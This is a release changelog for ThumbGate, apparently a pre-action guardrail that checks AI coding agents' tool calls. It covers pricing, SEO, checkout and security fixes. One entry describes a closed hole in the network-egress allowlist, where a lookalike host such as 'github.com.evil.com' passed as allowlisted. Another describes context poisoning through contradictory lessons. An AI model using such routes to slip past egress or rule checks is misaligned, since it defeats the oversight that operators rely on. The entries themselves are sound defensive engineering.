- [#2667](https://github.com/IgorGanapolsky/ThumbGate/pull/2667) [`10bca99`](https://github.com/IgorGanapolsky/ThumbGate/commit/10bca99c0bddae0df8871e7474588b28c7614332) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Constrain checkout interstitial hidden attribution to an allowlist so arbitrary request query parameters cannot be reflected into server-rendered HTML.

- [#2520](https://github.com/IgorGanapolsky/ThumbGate/pull/2520) [`b57b6d9`](https://github.com/IgorGanapolsky/ThumbGate/commit/b57b6d99dff5716f76ed9ae98c2b65b98f8bf947) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add deterministic sampling for the ThumbGate Pro checkout interstitial when direct-to-Stripe bypass is enabled, preserving fast checkout for unsampled visitors while exposing a configured slice of human traffic to buyer-objection feedback capture.

- [#2789](https://github.com/IgorGanapolsky/ThumbGate/pull/2789) [`6347fa6`](https://github.com/IgorGanapolsky/ThumbGate/commit/6347fa6f82ec37d6ae33878e87020d5d733a5e10) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add the commercialization strategy: open-core (free permissive runtime as the adoption wedge; learned models + exporters + hosted behind a real paywall), fundable repricing (Team/Enterprise, token-insurance ROI), and an investor one-pager. Decision: do NOT relicense to FSL/BUSL now — the code is commoditized and the moat is data + hosted state; relicensing stays an option for later once there's adoption to protect. MOAT.md points to the new strategy doc.

- [#2528](https://github.com/IgorGanapolsky/ThumbGate/pull/2528) [`b0457a2`](https://github.com/IgorGanapolsky/ThumbGate/commit/b0457a24ac12024930016d83cbef6603502189f6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - seo: add /compare/cycode buyer-intent comparison page

  Action [#5](https://github.com/IgorGanapolsky/ThumbGate/issues/5) from the 2026-06-05 LLM-citability deep-research: "X vs Y" comparison pages are what LLM answer engines (Perplexity, ChatGPT, Gemini, Claude, Grok) cite for buyer-intent "should I use A or B" queries. Cycode is the funded enterprise vendor anchoring the IDE-security category (Feb 2026 blog popularized PreToolUse / beforeMCPExecution / beforeReadFile naming); ThumbGate occupies the indie/MIT slot beneath them. Honest, non-hyperbolic comparison: enterprise platform vs MIT CLI; learning loop is the differentiator.

  Registered in seo-gsd inline list and prove-seo-gsd sitemap pin.

- [#2529](https://github.com/IgorGanapolsky/ThumbGate/pull/2529) [`ca47841`](https://github.com/IgorGanapolsky/ThumbGate/commit/ca47841cc2ca95801a9694aa264e049b10d0e63d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - seo: add /compare/claude-code-hooks-mastery (disler) buyer-intent comparison

  Companion to /compare/cycode. Per memory `project_fiddler_competitive_positioning`: ThumbGate's REAL competitor at the buyer-intent layer isn't funded enterprise vendors like Fiddler/Cycode — it's the free disler/claude-code-hooks-mastery repo (3,000+ stars). This page addresses the "why pay $19/mo when disler is free?" objection head-on: honest comparison of static example repo vs runnable CLI with learning loop. Same SEO-GSD pattern as /compare/cycode.

- [#2548](https://github.com/IgorGanapolsky/ThumbGate/pull/2548) [`8eba5e6`](https://github.com/IgorGanapolsky/ThumbGate/commit/8eba5e6149112b6aae18da3fe089471dd964c719) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - seo: wire all live /compare pages into the comparison hub and homepage

  The /compare hub linked to only 4 of 13 live comparison pages, and the homepage compare strip to 4 — both hand-maintained lists that drifted every time a new buyer-intent page shipped. Flagship competitor comparisons (claude-code-hooks, arcjet, bumblebee, anthropic-containment, oak-and-sparrow-gatekeeper, anthropic-claude-for-legal) were live and in the sitemap but unreachable from the hub whose entire job is to list them, and the homepage's only link to the hub was `display:none`. That starves the highest-intent pages of internal link equity from the site's top-authority surfaces — directly counter to the GEO/buyer-intent goal those pages exist for.

  This makes the hub a complete index of every live comparison (framing grounded in each page's own subtitle, no overclaim), adds the top buyer-intent links plus a visible "Compare all" hub link to the homepage strip, and pins the contract with a regression test (`/compare` must link to every `public/compare/*.html`) mirroring the existing sitemap-completeness test so it cannot silently drift again.

- [#2594](https://github.com/IgorGanapolsky/ThumbGate/pull/2594) [`df59c66`](https://github.com/IgorGanapolsky/ThumbGate/commit/df59c66a633b51309014d2604285c28e8f71ddab) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - docs(compare): add /compare/sigmashake — honest ThumbGate vs SigmaShake (and APort, agent-guardrails) comparison targeting "SigmaShake alternative" search intent. Leads with ThumbGate's auto-learning wedge (one thumbs-down → a permanent rule) while conceding where SigmaShake is genuinely ahead (FORCE-substitution, ruleset-hub breadth, maturity). Website-only page; not in the npm bundle. Wired into the /compare index.

- [#2679](https://github.com/IgorGanapolsky/ThumbGate/pull/2679) [`8aa6e3b`](https://github.com/IgorGanapolsky/ThumbGate/commit/8aa6e3b936fa1ceb424a88bed09b589f0085c963) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add public Headroom context-compression and sovereign coding model guardrail guides, plus LLM discovery links, so buyers comparing token compression or local coding models can find ThumbGate's pre-action enforcement layer.

- [#2631](https://github.com/IgorGanapolsky/ThumbGate/pull/2631) [`beb9dd3`](https://github.com/IgorGanapolsky/ThumbGate/commit/beb9dd3faea5c4e05c98456688bf150c6c071bf8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Include brand assets, statusbar SVGs, and buyer intent scripts in the packaged files to fix dashboard layout, broken thumbnails, and clickability for local npm installs. Bump package file count and size limits to accommodate these visual assets.

- [#2542](https://github.com/IgorGanapolsky/ThumbGate/pull/2542) [`a0f79b1`](https://github.com/IgorGanapolsky/ThumbGate/commit/a0f79b1d4fb97f9d2c9f261fb35466a984002eb3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a database-agent safety gate pack, harden SQL and migration pre-action checks, and publish a high-intent database safety guide for AI agents.

- [#2807](https://github.com/IgorGanapolsky/ThumbGate/pull/2807) [`811635b`](https://github.com/IgorGanapolsky/ThumbGate/commit/811635b94e885f6b160ff1cb7508455fb1d17920) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix `deny-network-egress` matching every `curl` and `wget` regardless of destination. The pattern led with bare `curl\s|wget\s` alternatives, so the allowlist was never consulted for them and loopback probes such as `curl http://localhost:9222` warned on every invocation, recording false-positive negative-feedback events. Detection now keys on the destination, with loopback (`localhost`, `127.0.0.1`, `[::1]`, `0.0.0.0`) added to the allowlist. Each allowlist entry is also anchored to a hostname boundary, closing a bypass where `open https://github.com.evil.com/x` was silently exempt because an allowlisted host matched as a bare prefix.

- [#2740](https://github.com/IgorGanapolsky/ThumbGate/pull/2740) [`be6a81b`](https://github.com/IgorGanapolsky/ThumbGate/commit/be6a81b6a0644839c4c11d26e79662f283e1e030) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix deploy-scope silently skipping deploys when production has drifted behind main. A push with no runtime-serving file changes now still triggers a catch-up deploy when the live `/health` build SHA is positively confirmed behind HEAD; unknown/unreachable preserves the historical skip (fail-safe). Prevents production freezing many commits behind main (root cause of the `/diagnostic` 404 — prod was sitting 86 commits behind).

- [#2550](https://github.com/IgorGanapolsky/ThumbGate/pull/2550) [`6f2458b`](https://github.com/IgorGanapolsky/ThumbGate/commit/6f2458ba03d32fefe4f867097e9b52db755bbee1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - chore(deps): bump protobufjs to ^8.5.0 (resolved 8.6.0), @lancedb/lancedb to ^0.30.0, @anthropic-ai/sdk to 0.100.1, @google/genai to 2.7.0, stripe to ^22.2.0

  Combined dependency bump consolidating dependabot PRs [#2435](https://github.com/IgorGanapolsky/ThumbGate/issues/2435)/[#2437](https://github.com/IgorGanapolsky/ThumbGate/issues/2437)/[#2438](https://github.com/IgorGanapolsky/ThumbGate/issues/2438)/[#2439](https://github.com/IgorGanapolsky/ThumbGate/issues/2439)/[#2436](https://github.com/IgorGanapolsky/ThumbGate/issues/2436) (all five passed targeted tests and were included). Single changeset satisfies the changeset:check gate that blocks lockfile-only dependabot PRs.

- [#2721](https://github.com/IgorGanapolsky/ThumbGate/pull/2721) [`fee04eb`](https://github.com/IgorGanapolsky/ThumbGate/commit/fee04eb2c3ce61dca00a238c446212546a735413) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a focused Workflow Hardening Diagnostic page with a tracked $499 diagnostic checkout path and deploy-gated route verification.

- [#2730](https://github.com/IgorGanapolsky/ThumbGate/pull/2730) [`60b98b2`](https://github.com/IgorGanapolsky/ThumbGate/commit/60b98b215b0d69ebfaa072dddb82e34e2cae2496) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix the `/diagnostic` page header logo. It rendered a placeholder CSS letter-"T" monogram (`<span class="mark">T</span>`) — the only page on the site doing so — which read as unfinished on the paid $499 diagnostic landing page. Replace it with the real brand mark (`/assets/brand/thumbgate-mark-inline-v3.svg`), matching every other page, and simplify the `.mark` style to a self-framed 28×28 image.

- [#2615](https://github.com/IgorGanapolsky/ThumbGate/pull/2615) [`132d626`](https://github.com/IgorGanapolsky/ThumbGate/commit/132d6269ddfe4de7ec048bd42b2d80f4378f140b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(distribution): add 5 discoverable auto-triggering Claude Skills that wrap existing MCP tools — `thumbgate-guard` (capture + force-promote a mistake into an enforced block), `thumbgate-rules` (list active prevention/reliability rules + their lessons), `thumbgate-blocked` (gate_stats + enforcement_matrix), `thumbgate-protect` (branch governance + scoped approvals), and `thumbgate-doctor` (wiring health). They are the description-discovered companion to the `/thumbgate-*` slash-commands ([#2611](https://github.com/IgorGanapolsky/ThumbGate/issues/2611)): same real MCP tools + CLI subcommands, **no new product logic**. Built to Anthropic's Agent Skills best practices (trigger-phrase descriptions with a "Do NOT use" over-trigger boundary, progressive disclosure via `references/`, a self-verify quality checklist). Also fixes three description antipatterns — `solve-architecture-autonomy` (replaced a 15-keyword over-broad description with narrow explicit triggers), `agent-memory` and `thumbgate-brand-voice` (added explicit trigger phrases + a Do-NOT clause). Guarded by `tests/discoverable-skill-skills.test.js`. Distribution is via the marketplace plugin (`"skills": "./skills/"`); npm `files[]` and the bundle ratchet are untouched.

- [#2570](https://github.com/IgorGanapolsky/ThumbGate/pull/2570) [`c1b8653`](https://github.com/IgorGanapolsky/ThumbGate/commit/c1b8653f85535538033be9a3165677621e9da635) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Wave 7 of the post-Reddit credibility cleanup: removes 13 docs/ root launch-theater markdown files (REDDIT*GTM_PLAYBOOK, MAY_2026_REVENUE_MACHINE, MONETIZATION_EXEC_SUMMARY, X_AUTOMATION*\*, etc.) that read as bot-farmed AI-output. Updates VERIFICATION_EVIDENCE.md and tests/version-metadata.test.js so nothing breaks.

- [#2787](https://github.com/IgorGanapolsky/ThumbGate/pull/2787) [`0329cee`](https://github.com/IgorGanapolsky/ThumbGate/commit/0329cee08ac0f1cf2792d230eb10b73dcec90daf) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Documentation + landing-page truthfulness audit: align all public copy and docs with the product's real behavior.

  - Enforcement: reworded ~300 claims across README, landing page, all `learn/`, `guides/`, `compare/` pages, and docs from false "physically blocks / cannot bypass / fails closed / blocks every repeat" to the accurate warn-by-default posture — ThumbGate flags and logs by default, hard-blocks only the catastrophic classes (secret exfiltration, destructive deletes, supply-chain) by default, and hard-blocks every rule under `THUMBGATE_STRICT_ENFORCEMENT=1`. "block" language retained only where true (catastrophic classes / strict mode).
  - Removed the unrelated Pretix/Hilltown Media Stripe-Connect consulting content from all public surfaces (meta, JSON-LD, about, learn, llms.txt) and deleted the Pretix case-study page.
  - Fixed the false free-tier "5-rule cap" → 3 (the canonical, test-enforced number); removed the fabricated "Most popular" badge; corrected internal docs that claimed "$20 booked revenue / first-dollar crossed" to the true 0 external customers.
  - Aligned moat copy with `MOAT.md` (hosted services, not a closed private "core"); marked regulated/enterprise claims (HIPAA/DORA/EU AI Act/SSO) as roadmap/available-on-request; fixed a stale `1.27.17` install version → 1.27.20; softened a "peer-reviewed" arXiv-preprint claim; removed retired X/Twitter links.
  - Updated the pinning tests (check-congruence, public-landing, public-static-assets) to assert the new truthful copy so CI enforces honesty going forward.

- [#2634](https://github.com/IgorGanapolsky/ThumbGate/pull/2634) [`6ac5086`](https://github.com/IgorGanapolsky/ThumbGate/commit/6ac5086b4fd1f9d54f763fd3f20a21117c417aa9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Report external customer revenue separately from owner/test Stripe activity in revenue status.

- [#2769](https://github.com/IgorGanapolsky/ThumbGate/pull/2769) [`f102e3d`](https://github.com/IgorGanapolsky/ThumbGate/commit/f102e3d7e4a3cb102ce9235c0dd4bd4ba76019b4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix checkout conversion bug: 99 visitors hit /checkout/pro in 30 days, 0 paid. The server-side Stripe session creation was failing silently (env var not configured on Railway), causing the form to loop back to the interstitial instead of redirecting to Stripe. Changed the form action to link directly to the Stripe Payment Link, bypassing the broken server-side flow entirely.

- [#2624](https://github.com/IgorGanapolsky/ThumbGate/pull/2624) [`5572bfb`](https://github.com/IgorGanapolsky/ThumbGate/commit/5572bfbc558804e6e53b0dc784397c9e2d19f667) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix the sticky Pay $499 diagnostic CTA so Stripe Checkout opens in the current tab instead of a fragile popup/new-tab flow.

- [#2601](https://github.com/IgorGanapolsky/ThumbGate/pull/2601) [`3c78a19`](https://github.com/IgorGanapolsky/ThumbGate/commit/3c78a194e669aeaac7195d48a0e4efc651f301da) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix LangGraph wording overclaim in marketplace distribution pack and status dashboard copy. Docs/wording-only; no behavioral change.

- [#2652](https://github.com/IgorGanapolsky/ThumbGate/pull/2652) [`2f578ea`](https://github.com/IgorGanapolsky/ThumbGate/commit/2f578ea469090f4dd127b651b1da923ecb11ab20) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Sharpen public positioning so ThumbGate is framed as pre-action governance with reviewable evidence, not self-governance or passive logging.

- [#2682](https://github.com/IgorGanapolsky/ThumbGate/pull/2682) [`f913c5f`](https://github.com/IgorGanapolsky/ThumbGate/commit/f913c5f24d424b631eb9872c8436373ca2778abb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add the Guardian/Ethicore policy-engine adapter and commercial-truth claim gates so ThumbGate can normalize external policy verdicts into local pre-action enforcement and require source-of-truth evidence before agents claim money, tax, checkout, inventory, permission, or customer-facing state is fixed or verified.

- [#2589](https://github.com/IgorGanapolsky/ThumbGate/pull/2589) [`b485f6d`](https://github.com/IgorGanapolsky/ThumbGate/commit/b485f6dd5b6311efb3209ee2274cb822fcbb7f06) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(health): report the actually-deployed commit in `/health` `buildSha`. On the Railway GitHub-connected service the baked `config/build-metadata.json` is the committed null placeholder and `RAILWAY_SYNC_VARIABLES` is off, so `THUMBGATE_BUILD_SHA` never updated and `/health` reported a months-old commit while newer code was live — which also made the deploy workflow's build-SHA verification gate fail on every run. `resolveBuildMetadata` now reads Railway's per-deploy `RAILWAY_GIT_COMMIT_SHA` (ground truth for GitHub-connected deploys) ahead of the drift-prone `THUMBGATE_BUILD_SHA`, while a properly baked file SHA still wins when present.

- [#2625](https://github.com/IgorGanapolsky/ThumbGate/pull/2625) [`cfdadf8`](https://github.com/IgorGanapolsky/ThumbGate/commit/cfdadf87eb2814c3f6b10ccfbca93ff4c16547c2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Hermes Agent guardrails positioning, compatibility entry points, and a public guide for self-improving agent workflows.

- [#2635](https://github.com/IgorGanapolsky/ThumbGate/pull/2635) [`8706f06`](https://github.com/IgorGanapolsky/ThumbGate/commit/8706f06a5c1749450c1904f23355d13ebd7cc5db) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Position Hermes-style self-evolution as safer reviewed rule and skill-change proposals instead of silent instruction overwrites.

- [#2612](https://github.com/IgorGanapolsky/ThumbGate/pull/2612) [`f555423`](https://github.com/IgorGanapolsky/ThumbGate/commit/f555423104ed53d8edbe3e40166c2b371cab411f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Rewrite the landing-page hero lede to lead with the concrete mechanism instead of a vague benefit claim. Replaces "AI agents will always hallucinate… we make their mistakes harmless" with what actually happens — ThumbGate blocks the specific dangerous tool call (rm -rf, force-push to main, leaked key, DROP on prod) in the PreToolUse hook before the shell runs it, and a thumbs-down becomes a prevention rule that stops the agent repeating it.

- [#2637](https://github.com/IgorGanapolsky/ThumbGate/pull/2637) [`4884d89`](https://github.com/IgorGanapolsky/ThumbGate/commit/4884d89fb1cb8f7759414d1ef77a034e8e30788f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Recognize hosted funnel telemetry as implemented tracking in the revenue status report.

- [#2623](https://github.com/IgorGanapolsky/ThumbGate/pull/2623) [`32684c1`](https://github.com/IgorGanapolsky/ThumbGate/commit/32684c1f6ca1e877eb77e43386a6801156d0b674) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Make agentic development cycle cards clickable on landing page.

- [#2622](https://github.com/IgorGanapolsky/ThumbGate/pull/2622) [`936af49`](https://github.com/IgorGanapolsky/ThumbGate/commit/936af49c50db06eba4c3c47d5781633c2b1163cc) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Delete broken skool asset symlinks to unblock Railway deployment.

- [#2620](https://github.com/IgorGanapolsky/ThumbGate/pull/2620) [`367424d`](https://github.com/IgorGanapolsky/ThumbGate/commit/367424dd39d8e08c6bdb122659e0fe041ba7566c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Serve static /media/ assets route to fix broken demo GIF in landing pages.

- [#2696](https://github.com/IgorGanapolsky/ThumbGate/pull/2696) [`28392bc`](https://github.com/IgorGanapolsky/ThumbGate/commit/28392bc1f5a110e765875451424e96bf1ecf7251) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Improve test coverage for Reddit browser notification watch script and publisher credential guards.

- [#2746](https://github.com/IgorGanapolsky/ThumbGate/pull/2746) [`cd54bc7`](https://github.com/IgorGanapolsky/ThumbGate/commit/cd54bc75f716ed513a80a3de4113ec005be084f0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add an owned `/install` buyer path that consolidates live ThumbGate distribution surfaces, verified install commands, marketplace status, and the paid Workflow Hardening Diagnostic CTA.

- [#2664](https://github.com/IgorGanapolsky/ThumbGate/pull/2664) [`7d350f1`](https://github.com/IgorGanapolsky/ThumbGate/commit/7d350f1633d0e52bd899693e12bb1db14fdc8ce1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden analytics JSON responses against HTML interpretation by adding `nosniff` headers and neutralizing HTML-significant telemetry strings.

- [#2530](https://github.com/IgorGanapolsky/ThumbGate/pull/2530) [`b7b0dda`](https://github.com/IgorGanapolsky/ThumbGate/commit/b7b0ddac90228bb7562c175b77f95764a9a5fc19) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add paid conversion paths to the high-traffic persistent-memory article so readers can move from the free install path into Pro checkout, the workflow diagnostic, or the workflow intake without hunting for pricing.

- [#2770](https://github.com/IgorGanapolsky/ThumbGate/pull/2770) [`e729195`](https://github.com/IgorGanapolsky/ThumbGate/commit/e729195ffc9cbf9baa2c3beada62dbbfc00ec36e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Serve the Hermes founding beta / Leash Pro pricing landing at `/leash-beta` with deploy-verify sentinel coverage.

- [#2742](https://github.com/IgorGanapolsky/ThumbGate/pull/2742) [`db60efd`](https://github.com/IgorGanapolsky/ThumbGate/commit/db60efd31c0e7b254fe247019b5abcaa991e6880) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a retrieval-time superseding filter to lesson retrieval. Same-topic lessons are now collapsed before final selection: duplicates drop to the higher-ranked one, and contradictions (opposite signal on the same rule/topic) keep the most recent — which supersedes the stale one. This prevents "context poisoning," where an agent could be handed two contradictory lessons (e.g. "never force-push" and "force-push is fine") at equal relevance. Conservative by design (distinct lessons are never merged); affects only lesson retrieval, not the hard gate rules.

- [#2753](https://github.com/IgorGanapolsky/ThumbGate/pull/2753) [`f1e5011`](https://github.com/IgorGanapolsky/ThumbGate/commit/f1e501106337c732c014150d30dc0b1a28f16c09) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Trust hardening of the published npm artifact. `verifyLicense()` now only considers `THUMBGATE_`-prefixed env vars as license candidates — it previously scanned every `*_API_KEY` / `*_PRO_KEY` env var, so an unrelated vendor's secret could be picked up as a license key — and its result object no longer carries the raw key value (callers only ever needed the boolean/source). The owner-email allowlist is no longer hardcoded in the shipped bundle: set `THUMBGATE_OWNER_EMAILS` (comma-separated) to classify owner traffic, matching the existing convention in `external-customer-audit`. The near-duplicate `scripts/bot-detector.js` is consolidated into `scripts/bot-detection.js`, which now also exports `classifyVisitor`, `shouldExcludeFromAnalytics`, and `botFilterMiddleware`, with the legacy crawler patterns merged into the unified `BOT_PATTERNS` list.

- [#2751](https://github.com/IgorGanapolsky/ThumbGate/pull/2751) [`4e523cf`](https://github.com/IgorGanapolsky/ThumbGate/commit/4e523cff671e97a86d1dc00be6dee21eb0caf273) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(mcp): stop reinstalling thumbgate@latest on every MCP server launch. The serve entry now fast-starts from the installed runtime and resolves @latest via npx only when the runtime is absent — matching the hook commands. Removes a per-launch blocking `npm install` that could hang or fail server startup on slow/offline networks (agents saw the server / capture "time out").

- [#2724](https://github.com/IgorGanapolsky/ThumbGate/pull/2724) [`5d927e0`](https://github.com/IgorGanapolsky/ThumbGate/commit/5d927e0682936b8eb201133966faf0b6408cdf42) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `npx thumbgate diagnostic` so npm/CLI users can reach the $499 Workflow Hardening Diagnostic intake and checkout paths directly from the package.

- [#2733](https://github.com/IgorGanapolsky/ThumbGate/pull/2733) [`2859021`](https://github.com/IgorGanapolsky/ThumbGate/commit/2859021cbc5f4f1a8fc4aecfda65afd0bbd6a18f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Memora-style nucleus (top-P) "decide when to stop" filtering to per-action lesson retrieval. Operators can set `THUMBGATE_RETRIEVAL_TOP_P` (or pass `options.topP`) to trim the low-relevance tail so a single dominant lesson isn't padded out to `maxResults` — fewer tokens stuffed into each PreToolUse warning and `retrieve_lessons` call. Off by default (`topP=1.0` is a no-op, so existing behaviour is unchanged). Also fixes the previously dead, mis-normalized `filterTopP` (now scale-free with a `minKeep` floor) and removes a duplicate `calculateRetrievalEntropy` definition.

- [#2669](https://github.com/IgorGanapolsky/ThumbGate/pull/2669) [`99cd471`](https://github.com/IgorGanapolsky/ThumbGate/commit/99cd471ea9ac18230fb5c56c52d0004a3b6ebe53) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Stop reflecting OAuth authorization query parameters into the browser consent page by storing pending authorization requests behind a short-lived opaque nonce.

- [#2671](https://github.com/IgorGanapolsky/ThumbGate/pull/2671) [`02de749`](https://github.com/IgorGanapolsky/ThumbGate/commit/02de749d8471756f1811fa1d5c046d5eb8c70536) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Escape the OAuth consent nonce before rendering it into the hidden form attribute so the hosted connector authorization page remains explicit about its HTML boundary.

- [#2699](https://github.com/IgorGanapolsky/ThumbGate/pull/2699) [`06ff2fe`](https://github.com/IgorGanapolsky/ThumbGate/commit/06ff2fe65b66dfb03e589fc92c025b769566ae4a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Optimize inline brand logo (shield and thumbs-up) size, stroke-width, and transparency inside navigation headers to prevent blurriness and increase contrast on dark themes.

- [#2674](https://github.com/IgorGanapolsky/ThumbGate/pull/2674) [`ee14437`](https://github.com/IgorGanapolsky/ThumbGate/commit/ee1443728d4930b28b66ee50e98d553a08bb2b0d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Patch transitive audit advisories by pinning the Changesets YAML parser and agent-runtime protobuf parser chains to non-vulnerable versions.

- [#2818](https://github.com/IgorGanapolsky/ThumbGate/pull/2818) [`c0d9a06`](https://github.com/IgorGanapolsky/ThumbGate/commit/c0d9a0610dde0c700c92ec9b456369d59c47f04f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix a deadlock that prevented `npm run pr:manage` from ever queuing a PR whose only outstanding check was the merge queue's own. `Trunk Merge Queue (main)` stays `pending` until a PR enters the queue, and `summarizeChecks()` bucketed every check — including that one — so pr-manager refused to submit while "1 quality check is still pending." The guard waited on its own output. Twelve Dependabot PRs sat stuck this way for up to 25 days with all seven required checks green. `config/merge-quality-checks.json` now carries a `selfReferentialChecks` list, and `summarizeChecks()` skips those names. Genuine pending or failing quality checks still block, verified by test.

- [#2527](https://github.com/IgorGanapolsky/ThumbGate/pull/2527) [`7bfe020`](https://github.com/IgorGanapolsky/ThumbGate/commit/7bfe020f0539b0bbfeba34fc3b8493b841165f5c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Reduce pricing-page checkout friction by sending Pro CTAs directly to the confirmed checkout path where Stripe collects email, while preserving bot-safe interstitial protection and adding first-party pricing page/CTA telemetry.

- [#2557](https://github.com/IgorGanapolsky/ThumbGate/pull/2557) [`d6cb6db`](https://github.com/IgorGanapolsky/ThumbGate/commit/d6cb6db89f2251e0f1d5809678153436ee735fa9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Pricing surface hygiene: remove dead `.price-card.team-card` CSS left over from the retired Team tier (no element references it; the Enterprise card uses `.enterprise-card`), and correct the stale `verify-pricing-surfaces` skill so it stops flagging the intentionally plausible-only checkout interstitial as a missing-analytics bug. Prices corrected to $0/$19/$149 and the real checkout health signal (302 → live Stripe) documented.

- [#2642](https://github.com/IgorGanapolsky/ThumbGate/pull/2642) [`2debbb5`](https://github.com/IgorGanapolsky/ThumbGate/commit/2debbb54fca5d4e44d78588e412622148dd800cc) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Complete the Team-tier retirement across the public marketing surface. The buyer-facing pricing page retired the Team tier in favor of Free/Pro/Enterprise ([#2488](https://github.com/IgorGanapolsky/ThumbGate/issues/2488), [#2557](https://github.com/IgorGanapolsky/ThumbGate/issues/2557)), but 50 SEO/comparison/guide pages still advertised the dead `Team $49/seat/mo` tier, and several tests still asserted it as "current." This sweeps every public page from `Team $49/seat/mo` to the live `Enterprise` third tier (keeping `Pro $19/mo or $149/yr`), and updates the page-copy assertions in `seo-guides.test.js` and `competitive-positioning-marketing.test.js` to match.

  Scope note: this is the buyer-facing copy reconciliation only. The dormant Team SKU still wired into the Stripe catalog, the `planId=team` checkout path, and the 24 active `$49` Stripe prices (0 customers ever) are intentionally left untouched here — that billing-infra decommission is a separate change.

- [#2796](https://github.com/IgorGanapolsky/ThumbGate/pull/2796) [`a01ba56`](https://github.com/IgorGanapolsky/ThumbGate/commit/a01ba56113835a7e319e47dc9bfb8a7e3e96116b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Email the operator when a customer activates ThumbGate Pro locally. The CLI now pings the hosted activation endpoint with the Pro key only as Bearer auth, while the hosted server validates the billing key and sends a secret-safe owner alert containing only a key fingerprint and activation metadata.

- [#2803](https://github.com/IgorGanapolsky/ThumbGate/pull/2803) [`140a761`](https://github.com/IgorGanapolsky/ThumbGate/commit/140a761ac3689ac192c26e9019a7af197da68018) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route confirmed `/checkout/pro` bypass traffic to the Pro $19/mo Stripe Payment Link instead of the $1 first-failure-rule product, and tighten public conversion copy around the enterprise AI-agent governance buyer.

- [#2805](https://github.com/IgorGanapolsky/ThumbGate/pull/2805) [`d8645e0`](https://github.com/IgorGanapolsky/ThumbGate/commit/d8645e062751965aaf5f69625c750cc1b90cfa21) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Align Pro and Enterprise packaging copy across checkout, pricing, public pages, LLM context, and CLI receipts. Pro is personal recall, dashboard proof, exports, and managed adapters; Enterprise is shared hosted lessons, org visibility, and rollout support.

- [#2759](https://github.com/IgorGanapolsky/ThumbGate/pull/2759) [`dc18cbb`](https://github.com/IgorGanapolsky/ThumbGate/commit/dc18cbb7ea0f25622a46f46e61c2ef8b744db19e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add ThumbGate Pro tier section to README with Stripe payment link. Lists Pro features (team-wide policies, centralized feedback memory, budget monitoring, priority support) and links to the $19/month payment page.

- [#2668](https://github.com/IgorGanapolsky/ThumbGate/pull/2668) [`d7d41ba`](https://github.com/IgorGanapolsky/ThumbGate/commit/d7d41ba76dea393212ae9cd0c56c3123062d5f51) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route public HTML detail pages through server-built slug allowlists and sanitize forwarded hosts before rendering HTML or OpenAPI metadata.

- [#2662](https://github.com/IgorGanapolsky/ThumbGate/pull/2662) [`0b3b4a1`](https://github.com/IgorGanapolsky/ThumbGate/commit/0b3b4a1801b4b09db2c4a69bfcee4e676e31ba88) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep Cloudflare Worker maintenance changes out of the Railway deploy scope while preserving Railway deploys for root runtime dependency and serving-surface changes.

